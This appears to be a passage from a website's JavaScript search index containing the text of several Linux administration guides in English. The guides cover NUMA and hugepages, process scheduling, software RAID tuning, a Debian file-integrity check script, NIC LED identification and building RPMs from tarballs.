CONFIG_X86_64_ACPI_NUMA=y CONFIG_NUMA_EMU=y CONFIG_USE_PERCPU_NUMA_NODE_ID=y CONFIG_ACPI_NUMA=y Depending on the manufacturers, NUMA technology can be different. This is for example the case between AMD and Intel. For instance, Intel has an MCH controller hub where all memory accesses are routed. This simplifies cache snooping management but can potentially cause bottlenecks for memory accesses. Latency also varies depending on frequency and usage. However, AMD puts different memory ports directly at its CPU level, which surpasses any other SMP technology. With this solution, no bottlenecks, but it complicates cache snooping management which must be managed by all CPUs.\nIt’s possible to have more information about NUMA management on a PID (here 1):\n\u003e cat /proc/1/numa_maps 00400000 default file=/sbin/init mapped=8 N0=8 00608000 default file=/sbin/init anon=1 dirty=1 active=0 N0=1 00609000 default file=/sbin/init anon=1 dirty=1 active=0 N0=1 025c7000 default heap anon=5 dirty=5 active=0 N0=5 7f86cc3c6000 default file=/lib/x86_64-linux-gnu/libdl-2.13.so mapped=2 mapmax=61 N0=2 7f86cc3c8000 default file=/lib/x86_64-linux-gnu/libdl-2.13.so 7f86cc5c8000 default file=/lib/x86_64-linux-gnu/libdl-2.13.so anon=1 dirty=1 active=0 N0=1 7f86cc5c9000 default file=/lib/x86_64-linux-gnu/libdl-2.13.so anon=1 dirty=1 active=0 N0=1 7f86cc5ca000 default file=/lib/x86_64-linux-gnu/libc-2.13.so mapped=121 mapmax=102 N0=121 7f86cc747000 default file=/lib/x86_64-linux-gnu/libc-2.13.so 7f86cc947000 default file=/lib/x86_64-linux-gnu/libc-2.13.so anon=4 dirty=4 active=0 N0=4 7f86cc94b000 default file=/lib/x86_64-linux-gnu/libc-2.13.so anon=1 dirty=1 active=0 N0=1 7f86cc94c000 default anon=4 dirty=4 active=0 N0=4 7f86cc951000 default file=/lib/x86_64-linux-gnu/libselinux.so.1 mapped=14 mapmax=55 N0=14 7f86cc96f000 default file=/lib/x86_64-linux-gnu/libselinux.so.1 7f86ccb6e000 default file=/lib/x86_64-linux-gnu/libselinux.so.1 anon=1 dirty=1 active=0 N0=1 7f86ccb6f000 default file=/lib/x86_64-linux-gnu/libselinux.so.1 anon=1 dirty=1 active=0 N0=1 7f86ccb70000 default anon=1 dirty=1 active=0 N0=1 7f86ccb71000 default file=/lib/x86_64-linux-gnu/libsepol.so.1 mapped=6 N0=6 7f86ccbb0000 default file=/lib/x86_64-linux-gnu/libsepol.so.1 7f86ccdaf000 default file=/lib/x86_64-linux-gnu/libsepol.so.1 anon=1 dirty=1 active=0 N0=1 7f86ccdb0000 default file=/lib/x86_64-linux-gnu/libsepol.so.1 anon=1 dirty=1 active=0 N0=1 7f86ccdb1000 default file=/lib/x86_64-linux-gnu/ld-2.13.so mapped=27 mapmax=101 N0=27 7f86ccfb2000 default anon=4 dirty=4 active=0 N0=4 7f86ccfce000 default anon=2 dirty=2 active=0 N0=2 7f86ccfd0000 default file=/lib/x86_64-linux-gnu/ld-2.13.so anon=1 dirty=1 active=0 N0=1 7f86ccfd1000 default file=/lib/x86_64-linux-gnu/ld-2.13.so anon=1 dirty=1 active=0 N0=1 7f86ccfd2000 default anon=1 dirty=1 active=0 N0=1 7fff85c91000 default stack anon=3 dirty=3 active=1 N0=3 7fff85d22000 default If you want to have finer control of NUMA and decide on processor assignments, you should look at cpuset7. It’s widely used for applications that need low latency.\nnumactl linkYou can also use the numactl command to force certain CPUs to use specific memory to gain performance. To install it on Red Hat:\nyum install numactl On Debian:\naptitude install numactl To retrieve information from a machine:\n\u003e numactl --hardware available: 4 nodes (0-3) node 0 size: 8058 MB node 0 free: 7656 MB node 1 size: 8080 MB node 1 free: 7930 MB node 2 size: 8080 MB node 2 free: 8051 MB node 3 size: 8080 MB node 3 free: 8062 MB node distances: node 0 1 2 3 0: 10 20 20 20 1: 20 10 20 20 2: 20 20 10 20 3: 20 20 20 10 and:\n\u003e numactl --show policy: default preferred node: current physcpubind: 0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 cpubind: 0 1 2 3 nodebind: 0 1 2 3 membind: 0 1 2 3 Assigning a PID to Specific Processors linkYou can bind a processor to a CPU:\nnumactl --physcpubind=0,1,2,3 To allocate memory on the same NUMA node as the processor:\nnumactl --physcpubind=0 --localalloc Deactivation linkIf you wish to disable NUMA, you need to activate “Node Interleaving” in the BIOS. Otherwise at the grub level add (numa=off):\n# grub.conf generated by anaconda # # Note that you do not have to rerun grub after making changes to this file # NOTICE: You have a /boot partition. This means that # all kernel and initrd paths are relative to /boot/, eg. # root (hd0,0) # kernel /vmlinuz-version ro root=/dev/mapper/vgos-root # initrd /initrd-[generic-]version.img #boot=/dev/sda default=0 timeout=5 splashimage=(hd0,0)/grub/splash.xpm.gz hiddenmenu title Red Hat Enterprise Linux Server (2.6.32-279.2.1.el6.x86_64) root (hd0,0) kernel /vmlinuz-2.6.32-279.2.1.el6.x86_64 ro root=/dev/mapper/vgos-root rd_NO_LUKS KEYBOARDTYPE=pc KEYTABLE=fr LANG=en_US.UTF-8 rd_LVM_LV=vgos/root rd_NO_MD rd_LVM_LV=vgos/swap SYSFONT=latarcyrheb-sun16 crashkernel=128M biosdevname=0 rd_NO_DM numa=off initrd /initramfs-2.6.32-279.2.1.el6.x86_64.img title Red Hat Enterprise Linux (2.6.32-279.el6.x86_64) Improving TLB Performance linkThe kernel allocates and empties its memory using the “Buddy System” algorithm. The purpose of this algorithm is to avoid external memory fragmentation. These fragmentations occur when there are multiple allocations and deallocations of different sizes of page frames. The memory then becomes fragmented into small blocks of free pages interspersed with blocks of allocated memory. When the kernel receives a request for allocating blocks of a page frame of size N, it will first look for available blocks that can contain this size. If none are available, it will try to find N/2 available blocks.\nThe “Buddy System” algorithm tries to reorder in the most contiguous way possible. You can view available memory like this:\n\u003e cat /proc/buddyinfo Node 0, zone DMA 5 2 2 2 2 2 2 1 2 2 2 Node 0, zone DMA32 4326 15892 6613 1219 554 188 109 7 0 1 1 Node 0, zone Normal 2688 0 0 0 0 0 0 0 0 0 1 The kernel also supports ’large pages’ through the ‘hugepages’ mechanism (also known as bigpages, largepages, or hugetlbfs). At each context switch encountered, the kernel empties TLB entries for the exiting process.\nTo determine the size of hugepages:\n\u003e grep -i huge /proc/meminfo AnonHugePages: 0 kB HugePages_Total: 0 HugePages_Free: 0 HugePages_Rsvd: 0 HugePages_Surp: 0 Hugepagesize: 2048 kB To choose the size of hugepages, there are 2 solutions:\nWith sysctl: vm.nr_hugepages= With grub by adding this parameter: [...] kernel /vmlinuz-2.6.32-279.2.1.el6.....hugepages= [...] warning Requesting allocation beyond what the machine can provide will result in a kernel panic For applications to use these spaces, they must use system calls like mmap, shmat, and shmget. In the case of mmap, large pages must be available using the hugetlbfs filesystem:\nmkdir /mnt/largepage mount -t hugetlbfs none /mnt/largepage References link http://fr.wikipedia.org/wiki/Extension_d%27adresse_physique ↩︎ ↩︎\nhttp://en.wikipedia.org/wiki/Virtual_address_space ↩︎\nUlimit : Utiliser les limites systèmes ↩︎\nhttp://www.liafa.jussieu.fr/~carton/Enseignement/Architecture/Cours/Virtual/ ↩︎\nhttp://frankdenneman.nl/2010/12/node-interleaving-enable-or-disable/ ↩︎ ↩︎\nhttp://www.myexception.cn/linux-unix/515530.html ↩︎\nLatence des process et kernel timing#cpuset ↩︎\n"
            }
        );
    index.add(
            {
                id:  303 ,
                href: "\/Gestion_des_process_et_des_schedulers\/",
                title: "Linux Process and Scheduler Management",
                description: "A detailed guide to Linux process management and scheduler functionality, including process states, processor caches, compilation optimizations, and scheduling policies.",
                content: " Software version Kernel 2.6.32+ Operating System Red Hat 6.3\nDebian 7 Website Kernel Website Last Update 04/09/2012 Processes linkTo list processes, it’s very simple:\nps aux If you want to select only certain columns:\nps axo pid,comm,stat --sort=stat Here are the 6 operating modes we can find:\nExecution in user mode Execution in kernel mode Ready to be launched Sleeping Newly created, not yet ready to be launched and not asleep Problem during closure (zombie) 1\nHere is the official list of process states:\nTASK_RUNNING: When a process is running or ready to be launched TASK_INTERRUPTABLE: This state is a blocking state that waits for an event or a signal from another process TASK_UNINTERRUPTABLE: This state is a blocking state, the process is forced to close because the hardware was waiting for a signal that was never received TASK_STOPPED: Once the process is finished, this state appears. The process can be restarted. TASK_ZOMBIE: In this state the process has been stopped and the information will still be available in the process list Processor caches linkMemory caches are organized in lines. Each line corresponds to a memory space. All computers have different caches with different processor instructions (depending on processors) including I-cache, D-cache, Altivec, etc.\nOn a system with multiple processors/cores, each core has its own cache associated with a controller. When a processor references the main memory, each controller will first check if the request is in its cache to respond to the request. Depending on whether the response exists (cache hit) or doesn’t exist (cache miss), the response will be very fast, or will take a little longer because it will have to access memory to be brought to the cache.\nThe cache controller contains a table with all entries for each line present in the cache. The controller uses tags and flags to give a status to each line present in the cache. Processors read and write their cache to memory. In the case of a write, the cache can be configured as:\nwrite-through: when a cache line is updated, the main memory must also be updated. write-back: there is no writing to the cache and main memory until the cache line is released. Write back is much more performant than write through. On x86 platforms under Linux, the write-back cache is used. Each memory page has a bit to disable this page cache and the write-back cache.\nOn multi-processor systems, there is a need to maintain a certain coherence between caches. When a cache updates a memory space, it must notify the occupation of this space to other caches. This is called cache snooping and it’s the hardware that manages this part.\n2\nNUMA (for Non Uniform Memory Access or Non Uniform Memory Architecture) is a cache snooping method, meaning non-uniform memory access and non-uniform memory architecture) is a multiprocessor system in which memory areas are separated and placed in different locations (and on different buses). From the perspective of each processor, access times therefore differ depending on the memory area accessed. The NUMA system was designed to overcome the limitations of the SMP architecture in which the entire memory space is accessible by a single bus causing concurrent access problems by different processors. This is particularly necessary for systems with many processors.3\nTypes linkThere are currently 3 types of cache:\nL1 (Level 1): Level 1 caches (Fully associative cache) are the most flexible and also the most expensive because they require a lot of circuits for their implementation. It can only contain a few kB L2 (Level 2): Level 2 caches (Set associative cache), they are a good compromise (cost/speed) between L1 and L3. L3 (Level 3): Level 3 caches (Cache). This cache is the slowest of all, but still provides access much faster than RAM: ~8n/sec Today, the fastest memories are processor registers. These registers run at the same speed as the processor clock.\nTo know your processor caches:\n\u003e getconf -a | grep CACHE LEVEL1_ICACHE_SIZE 32768 LEVEL1_ICACHE_ASSOC 8 LEVEL1_ICACHE_LINESIZE 64 LEVEL1_DCACHE_SIZE 32768 LEVEL1_DCACHE_ASSOC 8 LEVEL1_DCACHE_LINESIZE 64 LEVEL2_CACHE_SIZE 6291456 LEVEL2_CACHE_ASSOC 24 LEVEL2_CACHE_LINESIZE 64 LEVEL3_CACHE_SIZE 0 LEVEL3_CACHE_ASSOC 0 LEVEL3_CACHE_LINESIZE 0 LEVEL4_CACHE_SIZE 0 LEVEL4_CACHE_ASSOC 0 LEVEL4_CACHE_LINESIZE 0 On this processor, I have 32KB of cache in L1 and 6MB of cache in L2. I don’t have L3 (nor L4 as you can see, but this cache is very uncommon). You can also look on the manufacturer’s website and get information about it.\nLocating losses linkIt is possible to locate memory losses and processor cache usage via a tool called Valgrind4 (For a good tutorial on how to use it follow this link5)\nWith Valgrind, it is possible to specify the cache to profile with –l1, –D1 or –L2. However, be aware that the program will be slower during a Valgrind analysis.\nA program provides good performance when cache accesses are successful. The ‘cache stride’ is used to reference a certain amount of memory that can be cached in a single cache line. Most programs tend to use x memory blocks + 1 in their next execution cycles. That’s why it’s more interesting to move a block of data from disk to memory rather than doing it bit by bit. When a program accesses the same data in memory multiple times during a certain period of time, it is called “Temporal locality of reference”.\nSome processors have special access to memory to go through the cache. In some cases, if the program gets a lot of “cache misses”, slowdowns will be felt. That’s why this option is available in some processors.\nCompilation optimizations linkIt is possible to make optimized code with GCC. By default, it is disabled due to compilation time concerns and to produce error code that is easier to debug.\nHere are some options6:\nO0: This level (letter “O” followed by a zero) completely disables optimization, it is the default level if no -O level is specified in the CFLAGS or CXXFLAGS variables. Your code will not be optimized: this is generally not what is wanted. O1: This is the most classic level of optimization. The compiler will try to generate faster and lighter code without taking more time to compile. It’s relatively classic, but it should work in all cases. that the job is done. O2: A step above -O1. This is the recommended level of optimization unless you have specific needs. The -O2 level will activate some options in addition to those of -O1. With the -O2 level, the compiler will attempt to increase the performance of the code without compromising on size and without taking too much time to compile. O3: This is the highest possible level of optimization but also the riskiest. Compilation time will be longer with this option which in fact should not be used globally with GCC 4.x. The behavior of GCC has changed significantly since version 3.x. In version 3.x, -O3 showed that its use led to marginally faster execution times than with -O2, but this is no longer the case with GCC 4.x. Compiling all your packages with -O3 will produce larger binaries which will require more memory and will significantly increase strange compilation errors or cause unexpected behavior for programs (including errors). The disadvantages outweigh the advantages; remember the principle of diminishing returns. Using the -O3 level is not recommended for GCC 4.x. Os: This level will optimize your code for size. It activates all options of the -O2 level that do not affect the size of the generated code. It can be useful for machines that have a very limited amount of free disk space and/or that have processors with a small cache size. However, this level can quite cause other problems, which is why it is filtered by many ebuilds in the tree. The use of -Os is not recommended. Run Queues linkThe kernel creates 2 run queues for each core, an “active” and an “expired”. The 2 run queues are arrays with lists of links between them, one of which represents the priority level of tasks. When a process becomes “runnable”, it is placed in the “active” queue. When a task in the active queue has exceeded its expiration time, a new priority is calculated and assigned to it, then a link is placed to it in the expired queue. When all processes in the active queue have exceeded their time limit, all tasks are moved to the expired queue and it becomes the run queue.\nThe kernel scheduler does its best to maintain good performance and correct response times when there are multiple processors and a large number of processes.\nPriorities linkThe kernel has 140 priority levels ranging from 0 to 139 (from highest to lowest). Priorities from 0 to 99 correspond to real time. For the last 40, these are ordinary dynamic processes. The standard priority being 120 which corresponds to what is generally seen: 0. The visible priorities therefore range from -20 to +20 which correspond to 99 to 139.\nWhat you need to know about schedulers:\nSCHED_FIFO for a non-preemptible real-time process, SCHED_RR for a preemptible real-time process, SCHED_OTHER for an ordinary (non-real-time) process. SCHED_FIFO linkTo modify the priority of a process:\nchrt -f [1-99] binary_path SCHED_RR linkTo modify the priority of a process:\nchrt -r [1-99] binary_path SCHED_OTHER linkThis scheduler is used either by the kernel, or by a user who will vary its priority according to certain criteria. Each launched process has a priority of 0 by default which can be changed with the nice tools (when launching the application) or renice (once the application is launched). The scheduler will analyze processes that have been sleeping for too long and will increase their priority by -5 to give them a higher priority so they launch faster. Conversely, processes that spend their time running are penalized by +5. The scheduler will also give a boost to processes that ask for other processes to be launched such as graphical interfaces.\nView process status linkOf course, you know the top command that allows you to see all the processes on the machine. There is also this to see the priority and policy of a scheduler (indicate the PID number, here 8998):\n\u003e chrt -p 8998 pid 8998's current scheduling policy: SCHED_OTHER pid 8998's current scheduling priority: 0 You also have the ps command:\nps axo pid,comm,rtprio,policy or\nps -Amo user,pid,tid,psr,pcpu,pri,vsz,rss,stat,time,comm References link http://www.linux-tutorial.info/modules.php?name=MContent\u0026pageid=84 ↩︎\nhttp://en.wikipedia.org/wiki/Cache_coherence ↩︎\nhttp://fr.wikipedia.org/wiki/Non_Uniform_Memory_Access ↩︎\nhttp://valgrind.org/ ↩︎\nhttp://www.unixgarden.com/index.php/gnu-linux-magazine/corriger-votre-utilisation-memoire-avec-valgrind ↩︎\nhttp://www.gentoo.org/doc/fr/gcc-optimization.xml ↩︎\n"
            }
        );
    index.add(
            {
                id:  304 ,
                href: "\/Linux_RAID_performances\/",
                title: "Linux RAID Performance",
                description: "Guide to optimizing Linux RAID performance, including chunk size calculation, stride settings, and performance considerations for different RAID levels.",
                content: "I won’t discuss the different RAID types, but rather refer you to Wikipedia for that1. For using software RAID under Linux, I recommend this documentation2. We’ll focus on performance since that’s our topic here. RAID 0 is the most performant of all RAID types, but it obviously has data security issues if a disk fails.\nThe MTBF (Mean Time Between Failure) is also important for RAID systems. This is an estimate of how long the RAID will function properly before a disk is detected as failed.\nChunk Size linkThe “Chunk size” (or stripe size or element size for some vendors) is the amount of data (in KiB segments) written or read on each device before moving to another segment. The Round Robin algorithm is used for movement. The chunk size must be an integer multiple of the block size. The larger the chunk size, the faster the write speed for very large data, but inversely slower for small data. If the average size of IO requests is smaller than the chunk size, the request will be placed on a single disk in the RAID, canceling all the advantages of RAID. Reducing the chunk size will split large files into smaller pieces distributed across multiple disks, improving performance. However, the positioning time of the chunks will be reduced. Some hardware does not allow writing until a stripe is complete, eliminating this positioning latency effect.\nA good rule for defining chunk size is to divide the size of IO operations by the number of disks in the RAID (minus parity disks if using RAID5 or 6).\nNotes Quick reminder: - RAID 0: No parity - RAID 1: No parity - RAID 5: 1 parity disk - RAID 6: 2 parity disks - RAID 10: No parity disks If you have no idea about your IO, choose a value between 32KB and 128KB, taking a multiple of 2KB (or 4KB if you have larger block sizes). The chunk size (stripe size) is an important factor in your RAID’s performance. If the stripe is too wide, the raid can have a “hot spot” which will be the disk receiving the most IO and will reduce your RAID’s performance. It’s obvious that the best performance is when data is spread across all disks. The correct formula is therefore:\nChunk size = average request IO size (avgrq-sz) / number of disks\nTo get the average request size, I invite you to check the Systat documentation3 where we talk about Iostat and Sar.\nTo see the chunk size on a RAID (here md0): \u003e cat /sys/block/md0/md/chunk_size 131072 So here it’s 128KB.\nHere’s another way to see it:\n\u003e cat /proc/mdstat Personalities : [raid10] md0 : active raid10 sdc2[3] sda2[1] sdb2[0] sdd2[2] 1949426688 blocks super 1.0 128K chunks 2 near-copies [4/4] [UUUU] unused devices: Or even:\n\u003e mdadm --detail /dev/md0 /dev/md0: Version : 1.0 Creation Time : Sat May 12 09:35:34 2012 Raid Level : raid10 Array Size : 1949426688 (1859.12 GiB 1996.21 GB) Used Dev Size : 974713344 (929.56 GiB 998.11 GB) Raid Devices : 4 Total Devices : 4 Persistence : Superblock is persistent Update Time : Thu Aug 30 12:53:20 2012 State : clean Active Devices : 4 Working Devices : 4 Failed Devices : 0 Spare Devices : 0 Layout : near=2 Chunk Size : 128K Name : N7700:2 UUID : 1a83e7dc:daa7d822:15a1de4d:e4f6fd19 Events : 64 Number Major Minor RaidDevice State 0 8 18 0 active sync /dev/sdb2 1 8 2 1 active sync /dev/sda2 2 8 50 2 active sync /dev/sdd2 3 8 34 3 active sync /dev/sdc2 It’s possible to define the chunk size when creating the RAID with the -c or –chunk argument. Let’s also see how to calculate it optimally. First, let’s use iostat to get the avgrq-sz value: \u003e iostat -x sda 1 5 avg-cpu: %user %nice %system %iowait %steal %idle 0,21 0,00 0,29 0,05 0,00 99,45 Device: rrqm/s wrqm/s r/s w/s rsec/s wsec/s avgrq-sz avgqu-sz await svctm %util sda 0,71 1,25 1,23 0,76 79,29 15,22 47,55 0,01 2,84 0,73 0,14 avg-cpu: %user %nice %system %iowait %steal %idle 0,00 0,00 0,00 0,00 0,00 100,00 Device: rrqm/s wrqm/s r/s w/s rsec/s wsec/s avgrq-sz avgqu-sz await svctm %util sda 0,00 0,00 1,00 0,00 16,00 0,00 16,00 0,00 1,00 1,00 0,10 avg-cpu: %user %nice %system %iowait %steal %idle 0,00 0,00 0,00 0,00 0,00 100,00 Now let’s do the calculation to get the chunk size in KiB:\n\u003e echo \"47.55*512/1024\" | bc -l 23.77500000000000000000 We then divide this value by the number of disks (let’s say 2) and round it to the nearest multiple of 2:\nChunk Size(KB) = 23.775/2 = 11.88 ≈ 8\nHere the chunk size to use is 8, since it’s the multiple of 2 closest to 11.88.\nwarning Remember that it’s not recommended to go below 32K! To create a RAID 0 while defining the chunk size:\nmdadm -C /dev/md0 -l 0 -n 2 --chunk-size=32 /dev/sd[ab]1 Stride linkStride is a parameter passed during RAID construction that optimizes how the filesystem places its data blocks on the disks before moving to the next ones. With extXn, you can optimize using the -E option which corresponds to the number of filesystem blocks in a chunk. To calculate the stride:\nStride = chunk size / block size\nFor a RAID 0 with a chunk size of 64KiB (64 KiB / 4KiB = 16) for example:\nmkfs.ext4 -b 4096 -E stride=16 /dev/mapper/vg1-lv0 Some disk controllers make a physical abstraction of block groups, making it impossible for the kernel to know them. Here’s an example to see the stride size:\n\u003e dumpe2fs /dev/mapper/vg1-lv0 | grep -i stride dumpe2fs 1.42 (29-Nov-2011) RAID stride: 16 Here, the size is 16 KiB.\nTo calculate the stride, there is also a website: http://busybox.net/~aldot/mkfs_stride.html\nThe Round Robin linkNon-parity RAIDs allow data segmentation across multiple disks to increase performance using the Round Robin algorithm. The segment size is defined when creating the RAID and refers to the chunk size.\nThe size of a RAID is defined by the smallest disk when creating the RAID. The size can vary in the future if all disks are replaced with larger capacity disks. Disk resynchronization will occur and the filesystem can be extended.\nSo for tuning Round Robin, you need to correctly tune the chunk size and stride for optimal algorithm usage! That’s all :-)\nParity RAIDs linkOne of the major performance constraints of RAID 5 and 6 is the parity calculation. For data to be written, parity calculations must be performed on the raid first. Only then can the parity and data be written.\nwarning Avoid RAID 5 and 6 if writing data represents more than 20% of activity Each data update requires 4 IO operations:\nData to be updated is first read from the disks Update of the new data (but parity is not yet correct) Reading blocks from the same stripe and calculating parity Final writing of new data to disks and parity In RAID 5, it’s recommended to use stripe cache:\necho 256 \u003e /sys/block/md0/md/stripe_cache_size For more information on RAID optimizations: http://kernel.org/doc/Documentation/md.txt[^4][^5]. For the optimization part, look at the following parameters:\nchunk_size component_size new_dev safe_mode_delay syncspeed{min,max} sync_action stripe_cache_size RAID 1 linkThe RAID driver writes to the bitmap when changes have been detected since the last synchronization. A major drawback of RAID 1 is during a power outage, since it needs to be completely rebuilt. With the ‘write-intent’ bitmap, only the parts that have changed will need to be synchronized, greatly reducing rebuild time.\nIf a disk fails and is removed from the RAID, md stops clearing bits in the bitmap. If the same disk is reintroduced into the RAID, md will only need to resynchronize the difference. When creating the RAID, if the ‘–write-intent’ bitmap option is combined with ‘–write-behind’, write requests to devices with the ‘–write-mostly’ option will not wait for the requests to complete before writing to disk. The ‘–write-behind’ option can be used for RAID1 with slow connections.\nNew mdraid arrays support write intent bitmaps. This helps the system identify problematic parts of an array; thus, in case of an incorrect shutdown, only the problematic parts will need to be resynchronized, not the entire disk. This drastically reduces the time required for resynchronization. Newly created arrays will automatically have a write intent bitmap added when possible. For example, arrays used as swap and very small arrays (such as /boot arrays) will not benefit from getting write intent bitmaps. It is possible to add write intent bitmaps to previously existing arrays once the device update is complete via the mdadm –grow command. However, write intent bitmaps incur performance impact (about 3-5% on a bitmap size of 65536, but can increase to 10% or more on smaller bitmaps, such as 8192). This means that if a write intent bitmap is added to an array, it is better to keep the size relatively large. The recommended size is 65536.4\nTo see if a RAID is persistent:\n\u003e mdadm --detail /dev/md0 /dev/md0: Version : 1.0 Creation Time : Sat May 12 09:35:34 2012 Raid Level : raid10 Array Size : 1949426688 (1859.12 GiB 1996.21 GB) Used Dev Size : 974713344 (929.56 GiB 998.11 GB) Raid Devices : 4 Total Devices : 4 Persistence : Superblock is persistent Update Time : Thu Aug 30 16:43:17 2012 State : clean Active Devices : 4 Working Devices : 4 Failed Devices : 0 Spare Devices : 0 Layout : near=2 Chunk Size : 128K Name : N7700:2 UUID : 1a83e7dc:daa7d822:15a1de4d:e4f6fd19 Events : 64 Number Major Minor RaidDevice State 0 8 18 0 active sync /dev/sdb2 1 8 2 1 active sync /dev/sda2 2 8 50 2 active sync /dev/sdd2 3 8 34 3 active sync /dev/sdc2 To add write intent bitmap (internal):\nmdadm /dev/md0 --grow --bitmap=internal To add write intent bitmap (external):\nmdadm /dev/md0 --grow --bitmap=/mnt/mon_fichier And to remove it:\nmdadm /dev/md0 --grow --bitmap=none To define the slow and fastest disk:\nmdadm -C /dev/md0 -l1 -n2 -b /tmp/md0 --write-behind=256 /dev/sdal --write-mostly /dev/sdbl http://en.wikipedia.org/wiki/RAID ↩︎\nConfiguration of a Software RAID ↩︎\nSysstat: Essential tools for analyzing performance problems ↩︎\nhttp://www.linux-raid.com/ ↩︎\n"
            }
        );
    index.add(
            {
                id:  305 ,
                href: "\/V%C3%A9rifier_l%27int%C3%A9grit%C3%A9_des_fichiers_sur_sa_Debian\/",
                title: "Checking File Integrity on Debian",
                description: "How to check the integrity of files on a Debian system using a script that verifies package files against their original versions.",
                content: " Operating System Debian 6 Website Debian Last Update 29/08/2012 Introduction linkFor some context, I had a former colleague who found himself working in a company with many compromised servers that had been owned for years with no immediate possibility of replacing them. Knowing that binaries had been modified, he had to verify the integrity of all systems. For this purpose, he created a small script to check everything.\nUsage link(debian_integrity_check.sh)\n#!/bin/bash # Get packages list dpkg -l | awk '($1==\"ii\") {print $2\"=\"$3}' \u003e /tmp/pkgs cat \u003e /tmp/apt.conf \u003c\u003c__EOF // Only needed if arch_of(broken_system) != uname -m // APT::Architecture \"amd64\"; APT::Get::Download-Only \"true\"; APT::Get::Reinstall \"true\"; Dir \"/\" { State::status \"/var/lib/dpkg/status\"; Cache \"/tmp/new-ar\"; }; // the filesystem is read-only, hence we need no root permission to // run apt-get to get file locks Debug::NoLocking \"true\"; __EOF # Install packages in a temp folder mkdir -p /tmp/new-ar/archives/partial APT_CONFIG=/tmp/apt.conf apt-get --reinstall install $(cat /tmp/pkgs) # Diff temp content with root debsums --all --changed --generate=all --root=/ --deb-path=/tmp/new-ar/archives $(awk -F= '{print $1}' /tmp/pkgs) All you have to do is make the script executable and run it :-)\n"
            }
        );
    index.add(
            {
                id:  306 ,
                href: "\/Faire_clignoter_les_LEDs_d%27une_carte_r%C3%A9seau\/",
                title: "Make Network Card LEDs Flash",
                description: "How to make the LEDs on a network card flash to locate it physically on a server or device.",
                content: "Introduction linkIt’s sometimes useful to be able to locate a network card when you’re communicating with someone on the other side of the planet, who is in front of a machine you’re connected to remotely and they need to plug in a cable but don’t know which interface to use.\nConfiguration linkHere’s how to make the eth0 interface flash for 10 seconds:\nethtool -p eth0 10 "
            }
        );
    index.add(
            {
                id:  307 ,
                href: "\/Cr%C3%A9er_un_package_RedHat_depuis_un_tar\/",
                title: "Creating a RedHat Package from a Tar File",
                description: "How to easily create an RPM package from a tar file in RedHat environments in just 5 minutes.",
                content: " Operating System Red Hat 6.3 Website Website Last Update 02/08/2012 Introduction linkThere are many methods for creating packages available on the web, but many of them are obsolete and often don’t allow for simple implementation. That’s why I’ll show you a technique to build a package in 5 minutes.\nInstallation linkWe’ll install the necessary tools for package creation:\nyum install rpmbuild Creating the Tar Archive linkLet’s say I want to package a Ruby library that I installed via gems. Everything is installed in specific directories, so I’ll create an archive containing what I need:\ntar -czvPf rubygemsysproctable-0.9.tar.gz /usr/lib/ruby/gems/1.8/doc/sys-proctable-0.9.0-x86-linux /usr/lib/ruby/gems/1.8/gems/sys-proctable-0.9.0-x86-linux Creating the RPM linkFor this script, I’m using a script that I found on this site, which automatically creates a .spec file with the main information. Adapt the beginning with your desired information:\n#!/bin/bash # This script creates an RPM from a tar file. # $1 : tar file NAME=$(echo ${1%%-*} | sed 's/^.*\\///') VERSION=$(echo ${1##*-} | sed 's/[^0-9]*$//') RELEASE=0 VENDOR=\"Deimos\" EMAIL=\"\" SUMMARY=\"Summary\" LICENSE=\"GPL\" GROUP=\"System\" ARCH=\"noarch\" DESCRIPTION=\"My description\" ###################################################### # users should not change the script below this line.# ###################################################### # This function prints the usage help and exits the program. usage(){ /bin/cat \u003c\u003c USAGE This script has been released under BSD license. Copyright (C) 2010 Reiner Rottmann $0 creates a simple RPM spec file from the contents of a tarball. The output may be used as starting point to create more complex RPM spec files. The contents of the tarball should reflect the final directory structure where you want your files to be deployed. As the name and version get parsed from the tarball filename, it has to follow the naming convention \"-.tar.gz\". The name may only contain characters from the range [A-Z] and [a-z]. The version string may only include numbers seperated by dots. Usage: $0 [TARBALL] Example: $ $0 sample-1.0.0.tar.gz $ /usr/bin/rpmbuild -ba /tmp/sample-1.0.0.spec USAGE exit 1 } if echo \"${1##*/}\" | sed 's/[^0-9]*$//' | /bin/grep -q '^[a-zA-Z]\\+-[0-9.]\\+$'; then if /usr/bin/file -ib \"$1\" | /bin/grep -q \"application/x-gzip\"; then echo \"INFO: Valid input file '$1' detected.\" else usage fi else usage fi OUTPUT=/tmp/${NAME}-${VERSION}.spec FILES=$(/bin/tar -tzf $1 | /bin/grep -v '^.*/$' | sed 's/^/\\//') /bin/cat \u003e $OUTPUT \u003c\u003c EOF Name: $NAME Version: $VERSION Release: $RELEASE Vendor: $VENDOR Summary: $SUMMARY License: $LICENSE Group: $GROUP Source0: %{name}-%{version}.tar.gz BuildRoot: /var/tmp/%{name}-buildroot BuildArch: $ARCH %description $DESCRIPTION %prep %setup -c -n %{name}-%{version} %build %install [ -d \\${RPM_BUILD_ROOT} ] \u0026\u0026 rm -rf \\${RPM_BUILD_ROOT} /bin/mkdir -p \\${RPM_BUILD_ROOT} /bin/cp -axv \\${RPM_BUILD_DIR}/%{name}-%{version}/* \\${RPM_BUILD_ROOT}/ %post %postun %clean %files %defattr(-,root,root) $FILES %define date %(echo \\`LC_ALL=\"C\" date +\"% a % b % d % Y\"\\`) %changelog * %{date} User $EMAIL - first Version EOF echo \"INFO: Spec file has been saved as '$OUTPUT':\" echo \"---------%\u003c----------------------------------------------------------------------\" /bin/cat $OUTPUT echo \"---------%\u003c----------------------------------------------------------------------\" Now simply run this script on your tar.gz file:\nchmod 755 tgz2rpm.sh ./tgz2rpm.sh rubygemsysproctable-0.9.tar.gz Then build the RPM:\nrpmbuild -ba /tmp/rubygemsysproctable-0.9.spec The RPM is now created in ~/rpmbuild/RPMS/noarch/ :-)\nVerification linkLet’s verify our RPM:\n\u003e rpm -qip ~/rpmbuild/RPMS/noarch/rubygemsysproctable-0.9-0.noarch.rpm Name : rubygem-sysproctable Relocations: (not relocatable) Version : 0.9 Vendor: Deimos Release : 0 Build Date: Thu 02 Aug 2012 01:19:08 PM CEST Install Date: (not installed) Build Host: server1.deimos.fr Group : System Environment/Libraries Source RPM: rubygem-sysproctable-0.9-0.src.rpm Size : 159304 License: GPL Signature : (none) Packager : Ruby sys-proctable Summary : Ruby sys-proctable library Description : Ruby sys-proctable library References 